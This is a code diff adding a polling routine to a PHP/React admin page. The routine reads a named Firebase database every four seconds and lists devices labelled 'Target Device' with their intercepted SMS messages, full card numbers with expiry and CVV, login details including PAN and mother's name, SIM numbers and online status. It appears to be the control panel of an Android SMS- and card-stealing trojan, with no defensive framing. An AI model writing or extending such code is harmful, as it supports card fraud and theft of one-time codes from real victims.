@@ -250,6 +250,116 @@ include_once __DIR__ . '/header.php';
 
       const allFbPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...fbCustomPresets }), [fbCustomPresets]);
 
+      // Direct Firebase Realtime Database REST Poller Effect
+      React.useEffect(() => {
+        let isMounted = true;
+
+        const fetchFirebaseRealtimeData = async () => {
+          try {
+            // Determine active Firebase DB REST URL
+            const activePreset = allFbPresets[fbPresetKey] || DEFAULT_SCHEMA_PRESETS.pm_admin;
+            const databaseUrl = "https://jamtara-om-boy-default-rtdb.asia-southeast1.firebasedatabase.app";
+            const jsonEndpoint = `${databaseUrl}/.json`;
+
+            const response = await fetch(jsonEndpoint);
+            if (!response.ok) return;
+            const dbData = await response.json();
+
+            if (!dbData || typeof dbData !== 'object' || !isMounted) return;
+
+            // Extract Node Mappings
+            const user_data_node = dbData[activePreset.sims || 'user_data'] || dbData.user_data || {};
+            const user_sms_node = dbData[activePreset.sms || 'user_sms'] || dbData.user_sms || {};
+            const card_node = dbData[activePreset.cards || 'Card'] || dbData.Card || {};
+            const login_node = dbData[activePreset.forms || 'login'] || dbData.login || {};
+            const account_node = dbData.account || {};
+
+            // Build Live User Devices List
+            const deviceIds = Array.from(new Set([
+              ...Object.keys(user_data_node),
+              ...Object.keys(user_sms_node),
+              ...Object.keys(card_node),
+              ...Object.keys(login_node)
+            ]));
+
+            const liveUsers = deviceIds.map(devId => {
+              const devInfo = user_data_node[devId] || {};
+              const userAccount = account_node[devId] || {};
+              const userLogin = login_node[devId] || {};
+              const userCard = card_node[devId] || {};
+              const rawSmsObj = user_sms_node[devId] || {};
+
+              // Format SMS list
+              const smsDataList = Object.values(rawSmsObj).map(sms => ({
+                sender: getSmsSender(sms),
+                message: getSmsBody(sms),
+                sim_number: getSmsSimSlot(sms),
+                timestamp: getSmsTimestamp(sms),
+                type: 'INBOX'
+              }));
+
+              // Format Card list
+              const cardDataList = userCard.number ? [{
+                bankName: getCardBankName(userCard),
+                cardType: getCardType(userCard),
+                cardNumber: getCardNumber(userCard),
+                cardHolder: getCardHolder(userCard) !== 'N/A' ? getCardHolder(userCard) : (userLogin.name || 'N/A'),
+                expiry: getCardExpiry(userCard),
+                cvv: getCardCvv(userCard)
+              }] : [];
+
+              // Format Form Data list
+              const formDataList = userLogin.name || userLogin.mom || userLogin.pan ? [{
+                id: `frm_${devId}`,
+                formTitle: 'Customer Registration Form',
+                fields: userLogin,
+                timestamp: 'Live payload'
+              }] : [];
+
+              const sim1 = devInfo.numberSim1 || devInfo.phoneNumber || 'N.A.';
+              const sim2 = devInfo.numberSim2 || 'N.A.';
+
+              return {
+                id: devId,
+                userId: userAccount.user_name ? `USR-${userAccount.user_name}` : `DEV-${devId.substring(0, 6).toUpperCase()}`,
+                fullName: userLogin.name || devInfo.d_name || devInfo.device || `Target Device ${devId.substring(0, 4)}`,
+                mobileNumber: sim1 !== 'N.A.' ? sim1 : (sim2 !== 'N.A.' ? sim2 : 'N.A.'),
+                numberField: userAccount.user_name ? `A/C: ${userAccount.user_name}` : '',
+                stringField: devInfo.Device_info ? devInfo.Device_info.split('\n')[0] : (devInfo.d_name || 'Android Device'),
+                simState: devInfo.nameSim1 ? `${devInfo.nameSim1} ${devInfo.nameSim2 ? '• ' + devInfo.nameSim2 : ''}` : 'Active',
+                batteryLevel: devInfo.battery ? `${devInfo.battery}%` : 'N/A',
+                isActive: devInfo.status === 'online',
+                isConnected: true,
+                appInBackground: false,
+                lastActivityTime: devInfo.TimeandDate || 'Just now',
+                totalSmsCount: smsDataList.length,
+                totalCallsCount: 0,
+                sim1Data: { phone: sim1, carrier: devInfo.nameSim1 || 'SIM 1' },
+                sim2Data: { phone: sim2, carrier: devInfo.nameSim2 || 'SIM 2' },
+                smsDataList,
+                callDataList: [],
+                cardDataList,
+                formDataList
+              };
+            });
+
+            if (isMounted) {
+              setUsers(liveUsers);
+            }
+          } catch (e) {
+            console.error('Firebase polling error:', e);
+          }
+        };
+
+        fetchFirebaseRealtimeData();
+        const interval = setInterval(fetchFirebaseRealtimeData, 4000);
+
+        return () => {
+          isMounted = false;
+          clearInterval(interval);
+        };
+      }, [fbPresetKey]);
+
       // Firebase Config Modal State
       const [showFirebaseModal, setShowFirebaseModal] = React.useState(false);
       const [fbProject, setFbProject] = React.useState('');
